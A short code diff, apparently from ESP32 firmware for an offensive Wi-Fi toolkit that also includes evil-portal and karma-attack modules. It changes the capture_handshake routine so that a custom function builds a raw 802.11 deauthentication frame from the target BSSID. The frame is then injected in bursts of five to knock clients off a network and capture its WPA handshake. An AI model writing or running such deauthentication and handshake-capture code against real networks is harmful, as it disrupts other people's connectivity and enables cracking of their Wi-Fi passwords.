@@ -16,6 +16,7 @@
 #include "esp_wifi.h"
 #include "evil_portal.h"
 #include "karma_attack.h"
+#include "mopie_tx.h"
 #include "sniffer.h"
 #include "vector"
 #include <Arduino.h>
@@ -515,9 +516,11 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
     bool needRedraw = true;
 
     auto sendDeauthBurst = [&]() {
-        wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
+        // Mopie's OWN deauth frame built from the target BSSID + injected.
+        uint8_t mopFrame[26];
+        mopie_build_deauth(mopFrame, bssid_array, _default_target, 0x0001);
         for (int i = 0; i < 5; i++) {
-            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+            mopie_send_raw(mopFrame, sizeof(mopFrame), channel, 1);
             vTaskDelay(10 / portTICK_PERIOD_MS);
         }
         deauthCount += 5;
